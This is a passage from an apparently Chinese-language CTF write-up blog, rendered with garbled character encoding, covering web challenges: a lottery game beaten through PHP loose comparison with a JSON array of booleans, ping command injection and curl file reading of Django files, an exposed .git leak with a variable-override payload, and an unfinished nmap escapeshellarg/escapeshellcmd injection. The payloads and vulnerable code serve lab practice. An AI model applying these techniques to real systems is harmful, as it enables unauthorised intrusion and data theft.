class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$money</span> = <span class="hljs-string">&#x27;$&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>]; <span class="hljs-comment">//moneyåœ¨SESSIONå˜é‡ä¸­ï¼Ÿç›´æ¥burpsuiteæŠ“åŒ…çœ‹çœ‹èƒ½ä¸èƒ½æ”¹</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;li&gt;Username: <span class="hljs-subst">$name</span>&lt;/li&gt;</span><br><span class="hljs-string">&lt;li&gt;Money: <span class="hljs-subst">$money</span>&lt;/li&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//acount.php</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥å»buyç•Œé¢çŒœæ•°æŠ“åŒ…çœ‹çœ‹å•¥æƒ…å†µï¼š</p><p><img src="/img/lo3.png" alt="lo3"></p><p>POSTä¼ äº†<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;7777777&quot;&#125;</code>ï¼Œ<code>action:buy</code>ï¼Œ<code>numbers</code>åé¢æ˜¯æˆ‘ä»¬çŒœçš„æ•°å­—ï¼Œç³»ç»Ÿä¼šæŠŠæ•°å­—å¸¦è¿›å»å’Œ<code>&quot;win_numbers&quot;:&quot;8701664&quot;</code>æ¯”è¾ƒï¼Œè¿™ä¸ª<code>win_numbers</code>å’Œæ¯”è¾ƒå¯¹é”™æ˜¯æ€ä¹ˆå®šä¹‰çš„ï¼Ÿæ‰¾æ‰¾æœ‰æ²¡æœ‰ç›¸å…³çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">require_registered</span>();<br><span class="hljs-title function_ invoke__">require_min_money</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];<br><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];<br><span class="hljs-variable">$win_numbers</span> = <span class="hljs-title function_ invoke__">random_win_nums</span>(); <span class="hljs-comment">//åé¢é‚£ä¸ªæ˜¯ç”Ÿæˆçš„ä¸ƒä½éšæœºæ•°</span><br><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//æŒºå¸¸è§çš„å¼±ç›¸ç­‰ï¼Œè‹¥å¯¹Numbersæ— è¿‡æ»¤åˆ™ç›´æ¥è¾“å…¥å¸ƒå°”Trueè®©å®ƒå’Œä»»ä½•éé›¶æ•°å­—ç›¸ç­‰</span><br><span class="hljs-variable">$same_count</span>++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;   <span class="hljs-comment">//ä¸¤ä¸ªåŠä»¥ä¸Šç›¸åŒæ‰ä¼šç»™é’±</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">300</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">1800</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">200000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5000000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;  <span class="hljs-comment">//æ¯æ¬¡å°è¯•éœ€è¦ä¸¤å—é’±</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;<br><span class="hljs-title function_ invoke__">response</span>([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>PHPçš„å¼±ç›¸ç­‰(&#x3D;&#x3D;)å’Œå¼ºç›¸ç­‰(&#x3D;&#x3D;&#x3D;)ç¢°è§æŒºå¤šæ¬¡äº†ï¼Œå¼±ç›¸ç­‰ä¼šåœ¨æ¯”è¾ƒä¹‹å‰è¿›è¡Œç±»å‹è½¬æ¢ï¼Œè½¬æ¢å®Œäº†å†æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰(å¯ä»¥ç”¨å¸ƒå°”ã€ç§‘å­¦è®¡æ•°æ³•ç­‰ç»•è¿‡)ã€‚å¼ºç›¸ç­‰ä¼šç›´æ¥æ¯”è¾ƒç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Ÿå†…å®¹æ˜¯å¦ç›¸ç­‰?(ä¸è¿‡ä¾ç„¶å¯ä»¥é€šè¿‡æ•°ç»„æ–¹æ³•ç»•è¿‡)ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ä¸‹é¢çš„æ€»ç»“å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« :https://blog.csdn.net/qq_43715020?<span class="hljs-keyword">type</span>=blog <br><br>åœ¨phpä¸­,å¦‚æœ<span class="hljs-type">bool</span>å’Œ&quot;ä»»ä½•å…¶ä»–ç±»å‹&quot;æ¯”è¾ƒ,&quot;ä»»ä½•å…¶ä»–ç±»å‹&quot;ä¼šè½¬æ¢ä¸º<span class="hljs-type">bool</span>ã€‚<br>åœ¨PHPä¸­å½“è½¬æ¢ä¸º <span class="hljs-type">boolean</span> æ—¶ï¼Œä»¥ä¸‹å€¼è¢«è®¤ä¸ºæ˜¯ <span class="hljs-keyword">FALSE</span> ï¼š<br>(<span class="hljs-number">1</span>) å¸ƒå°”å€¼ <span class="hljs-keyword">FALSE</span> æœ¬èº«<br>(<span class="hljs-number">2</span>) æ•´å‹å€¼ <span class="hljs-number">0</span>ï¼ˆé›¶ï¼‰<br>(<span class="hljs-number">3</span>)æµ®ç‚¹å‹å€¼ <span class="hljs-number">0.0</span>ï¼ˆé›¶ï¼‰<br>(<span class="hljs-number">4</span>)ç©ºå­—ç¬¦ä¸²ï¼Œä»¥åŠå­—ç¬¦ä¸² â€œ<span class="hljs-number">0</span>â€<br>(<span class="hljs-number">5</span>)ä¸åŒ…æ‹¬ä»»ä½•å…ƒç´ çš„æ•°ç»„(æ³¨æ„,ä¸€æ—¦åŒ…å«å…ƒç´ ,å°±ç®—åŒ…å«çš„å…ƒç´ åªæ˜¯ä¸€ä¸ªç©ºæ•°ç»„,ä¹Ÿæ˜¯<span class="hljs-keyword">true</span>)<br>(<span class="hljs-number">6</span>)ä¸åŒ…æ‹¬ä»»ä½•æˆå‘˜å˜é‡çš„å¯¹è±¡ï¼ˆä»… PHP <span class="hljs-number">4.0</span> é€‚ç”¨ï¼‰<br>(<span class="hljs-number">7</span>)ç‰¹æ®Šç±»å‹ <span class="hljs-keyword">NULL</span>ï¼ˆåŒ…æ‹¬å°šæœªèµ‹å€¼çš„å˜é‡ï¼‰<br>(<span class="hljs-number">8</span>)ä»ç©ºæ ‡è®°ç”Ÿæˆçš„ SimpleXML å¯¹è±¡<br>(<span class="hljs-number">9</span>)æ‰€æœ‰å…¶å®ƒå€¼åŒ…æ‹¬<span class="hljs-number">-1</span>éƒ½è¢«è®¤ä¸ºæ˜¯ <span class="hljs-keyword">TRUE</span> <br></code></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯æ‹¿æ•°ç»„å…ƒç´ ä¸€ä¸ªä¸€ä¸ªçš„æ¯”è¾ƒï¼Œé‚£å°±ç›´æ¥è®©<code>&quot;numbers&quot;</code>ä¸º[true,true,true,true,true,true,true]ã€‚</p><p>payload:<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></p><p><img src="/img/lo4.png" alt="lo4"></p><p>ä¸è¿‡æœ‰ä¸ªé—®é¢˜æˆ‘è¿˜æ²¡ææ‡‚ï¼šboolçš„trueå’Œfalseå¸¸é‡æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†æˆ‘æ”¹æˆï¼š<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[TRUE,TRUE,TRUE,TRUE,TRUE,TRUE,TRUE]&#125;</code>å°±ç»™æˆ‘å›æ˜¾invalid jsonã€‚ã€‚ã€‚éš¾é“jsonè¿™ä¸œè¥¿çš„ä¸€äº›å®šä¹‰è¿˜å¯¹å¤§å°å†™æœ‰è¯´æ³•ï¼Ÿ</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>é¢˜ç›®æè¿°: æŠ“ä½é‚£åªçŒ«</p><p><img src="/img/cat1.png" alt="cat1"></p><p>éšä¾¿è¾“äº†ä¸ªloli.clubæ²¡å•¥ååº”ï¼Œå•ä¸Šé¢çš„URLå˜åŒ–äº†ï¼š</p><p><code>/index.php?url=loli.club</code></p><p>GETä¼ å‚url?çœ‹ç€åƒå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><p>url&#x3D;etc&#x2F;passwdè¯•äº†åŠå¤©æ²¡å•¥ååº”ã€‚ã€‚ç”¨burpsuiteæŠ“åŒ…çœ‹responseæœ‰ä¸ªCATï¼Ÿè¾“ä¸ªCATå°è¯•ä¸€ä¸‹ï¼š</p><p><img src="/img/cat2.png" alt="cat2"></p><p>æ‰§è¡Œäº†pingå‘½ä»¤ï¼Ÿè¯•è¯•127.0.0.1ï¼š</p><p><img src="/img/cat3.png" alt="cat3"></p><p>æœç„¶æ˜¯pingå‘½ä»¤ï¼Œé‚£è¿™é¢˜å¯èƒ½æ˜¯RCEï¼Œä½†&amp;|;å‡è¢«è¿‡æ»¤æ‰äº†(æç¤ºinvalid URL)ã€‚ã€‚åé¢ä¸ä¼šåšäº†ï¼Œä¸‹é¢éƒ¨åˆ†å†…å®¹å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„åšå®¢ï¼Œæ„Ÿè°¢ï¼š<code>https://blog.csdn.net/qq_44065556/article/details/120541298å’Œhttps://www.cnblogs.com/xyongsec/p/11364520.html</code></p><p>æ—¢ç„¶æœ‰è¿‡æ»¤å°±è¦çœ‹çœ‹å®ƒè¿‡æ»¤äº†å•¥æ²¡è¿‡æ»¤äº†å•¥ï¼Œåœ¨æ¡†é‡Œè¾“å…¥ä¸œè¥¿åä¸Šé¢çš„URLä¼šå˜åŒ–ï¼š</p><p><code>http://61.147.171.105:53337/index.php?url=127.0.0.1%26ls</code></p><p>ç›´æ¥é€åˆ°burpsuiteé‡Œçˆ†ç ´ï¼Œé›†æŸç‚¸å¼¹æ¨¡å¼ä»<code>%00</code>çˆ†åˆ°<code>%FF</code>ï¼Œå‘ç°å½“URLå¤§äº%80åä¼šæœ‰æŠ¥é”™ï¼š</p><p><img src="/img/cat4.png" alt="cat4"></p><p><img src="/img/cat5.png" alt="cat5"></p><p>å‘ç°æœ‰<html>ï¼Œ<head>ç­‰æ ‡ç­¾çŒœæµ‹è¦æ”¹æˆhtmlåç¼€ï¼Ÿæ”¹å®Œåæ‰“å¼€ï¼š</p><p><img src="/img/cat6.png" alt="cat6"></p><p>è¿™ç©æ„å„¿æ˜¯ä¸ª<code>Django</code>æŠ¥é”™ç•Œé¢(æ„Ÿè§‰æœ‰ç‚¹åƒä»Šå¹´NSCTFé‚£é“é¢˜çš„æŠ¥é”™ç•Œé¢)ï¼š</p><p><code>illegal multibyte sequence æ„æ€æ˜¯éæ³•çš„å¤šå­—èŠ‚åºåˆ—</code></p><p>è€ŒGBKè¿™ä¸œè¥¿é¢å¯¹è¶…è¿‡0x7Fçš„æ—¶å€™ä¼šç”¨ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤ºã€‚æ„Ÿè§‰å°±æ˜¯è¿™é‡Œå‡ºäº†é—®é¢˜ï¼šè¶…è¿‡%7Fçš„URLå‡ä¼šæŠŠæŠ¥é”™ã€‚</p><p>è€Œä¸”å½“ <code>CURLOPT_SAFE_UPLOAD</code> ä¸º true æ—¶ï¼Œå¦‚æœåœ¨è¯·æ±‚å‰é¢åŠ ä¸Š@çš„è¯phpcurlç»„ä»¶æ˜¯ä¼šæŠŠåé¢çš„å½“ä½œç»å¯¹è·¯å¾„è¯·æ±‚ï¼Œæ¥è¯»å–æ–‡ä»¶ã€‚</p><p><img src="/img/cat7.png" alt="cat7"></p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ç§å…ˆæ‰¾settings.pyåœ¨æ‰¾databaseï¼Œå¦ä¸€ç§ç›´æ¥åœ¨æŠ¥é”™é¡µé¢ctrl+fæ‰¾database:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><p>djangoé¡¹ç›®ç”Ÿæˆæ—¶settings.pyä¼šå­˜æ”¾åœ¨é¡¹ç›®ç›®å½•ä¸‹å†ä»¥é¡¹ç›®åç§°å‘½åçš„æ–‡ä»¶å¤¹ä¸‹é¢:</p><p><code>/opt/api/api/settings.py</code></p><p>è¿›æ•°æ®åº“é‡Œç›´æ¥ctrl+Fç„¶åæ‰¾CTFå°±å¥½äº†ã€‚ã€‚ä¸è¿‡æˆ‘åšè¿™é“é¢˜çš„æ—¶å€™ä¸çŸ¥é“å’‹å›äº‹æ²¡æ³•è¯»ï¼Œä¸€ç›´è¿›çš„æ˜¯é‚£é¡µæŠ¥é”™ä¿¡æ¯ã€‚ã€‚ã€‚MD</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªç½‘é¡µï¼š</p><p><img src="/img/a4.png" alt="a4"></p><p>æ„Ÿè§‰åƒæ˜¯æ•æ„Ÿæ–‡ä»¶æ³„éœ²çš„é¢˜ï¼Ÿå…ˆè¯•è¯•&#x2F;.gitå†ç”¨dirsearchæ‰«ï¼š</p><p><img src="/img/a5.png" alt="a5"></p><p>æœ‰ä¸œè¥¿ï¼Œç›´æ¥ä¸ŠGithackï¼š</p><p><code>python GitHack.py http://af058f36-8fc4-47ff-86be-d9b094d1187b.node4.buuoj.cn/.git/</code></p><p>å‘ç°æœ‰<code>index.php</code>å’Œ<code>flag.php</code>ï¼š</p><p><img src="/img/a6.png" alt="a6"></p><p>è¿™é‡Œç¢°äº†é’‰å­ï¼šæœ‰æ—¶å€™Githackä¸çŸ¥é“æ˜¯æ‰«å¤ªå¿«äº†è¿˜æ˜¯å’‹å›äº‹ï¼Œæ— æ³•ä¸‹è½½æ‰«å‡ºæ¥çš„æ–‡ä»¶(æ¯”å¦‚ä¸€å¼€å§‹æˆ‘å°±æ‰¾ä¸åˆ°ä¸‹è½½çš„flag.phpå’Œindex.php)ã€‚åæ¥åœ¨ç½‘ä¸Šæ‰¾äº†åŠå¤©ï¼Œå¤§ä½¬è¯´æ˜¯çº¿ç¨‹å¤ªå¤šçš„åŸå› ï¼ŒæŠŠçº¿ç¨‹æ”¹å°å°±å¯ä»¥ä¸è¢«æ‹’ç»è®¿é—®ï¼Œæ–¹æ³•ï¼š</p><p><img src="/img/a7.png" alt="a7"></p><p>è¿™ä¸œè¥¿æœ¬æ¥æ˜¯10ï¼Œç»™æ”¹æˆ1å°±å¥½äº†ã€‚</p><p>(æˆ‘æ„Ÿè§‰æ˜¯æˆ‘ç”¨windowsçš„åŸå› ã€‚ã€‚ï¼Ÿå› ä¸ºä¹‹å‰dirsearchä¹Ÿå‡ºç°è¿‡è¿™ç§æƒ…å†µï¼Œç”¨Linuxå°±æ­£å¸¸äº†)</p><p><img src="/img/a8.png" alt="a8"></p><p>çœ‹çœ‹ä»–ä¿©æœ‰å•¥ä¸œè¥¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PHP">index.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  POSTä¼ x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;  <span class="hljs-comment">//å˜é‡è¦†ç›–,å˜é‡(xçš„å€¼)=y</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123; GETä¼ x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <span class="hljs-comment">//åŒä¸Šï¼Œå˜é‡(xçš„å€¼)=å˜é‡(yçš„å€¼)</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-comment">//éå†GETä¼ çš„</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);  <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$handsome</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<span class="hljs-comment">//GETã€POSTå‡æ²¡ä¼ flag</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);  <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$yds</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>); <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$is</span><br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br><br>flag.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$flagå·²ç»å®šä¹‰ï¼Œè¦æƒ³åŠæ³•æŠŠ$flagæå‡ºæ¥ã€‚ä½†é€šç¯‡åªæœ‰åˆ©ç”¨exitå»æ˜¾ç¤º$ydsã€$isã€$handsomeï¼Œå’Œå˜é‡è¦†ç›–è”ç³»ä¸€ä¸‹ï¼šæ˜¯å¦å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–ç›´æ¥exit($flag)ï¼Ÿ</p><p>ç¬¬äºŒä¸ªflagåœ¨æˆ‘çœ‹æ¥æœ€å¥½æ»¡è¶³ï¼šåªè¦GETPOSTéƒ½ä¸ä¼ flagå°±è¡Œäº†ï¼Œä½†æ˜¯å¦‚ä½•exit($flag)ï¼Ÿ</p><p><code>$yds=$flag</code>  $(xçš„å€¼)&#x3D;$(yçš„å€¼)-&gt;GETä¼ <code>yds=flag</code></p><p>payloadï¼š<code>/index.php?yds=flag</code></p><h2 id="BUUCTF-2018-Online-Tool-è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹"><a href="#BUUCTF-2018-Online-Tool-è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹" class="headerlink" title="[BUUCTF 2018]Online Tool è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹"></a>[BUUCTF 2018]Online Tool è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.ç¡®ä¿ç”¨æˆ·åªä¼ é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤ã€‚2ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°ã€‚3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚2.ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•°ã€‚3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚ è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·ä½¿ç”¨ä¼šå­˜åœ¨æ¼æ´ã€‚</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;    <span class="hljs-comment">//-T5 : å¯ä»¥åŠ å¿«æˆ–è€…å‡æ…¢æ‰«æé€Ÿåº¦ï¼Œæœ‰å…­ä¸ªçº§åˆ«ï¼Œçº§åˆ«è¶Šé«˜é€Ÿåº¦è¶Šå¿«ï¼Œä¹Ÿè¶Šå®¹æ˜“è¢«WAFæˆ–è€…IDSå‘ç°ã€‚-sTï¼šä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£ï¼Œä¼šå®Œæ•´çš„æ‰§è¡Œå®ŒTCPçš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œéšè”½æ€§ä¸å¼ºã€‚-Pnï¼šæœ‰æ—¶å€™é˜²ç«å¢™ä¼šç¦æ­¢pingè¯·æ±‚.-PNå‘½ä»¤å‘Šè¯‰Nmapä¸ç”¨pingè¿œç¨‹ä¸»æœºã€‚â€“host-timeout ï¼šé™åˆ¶æ¯ä¸ª IP 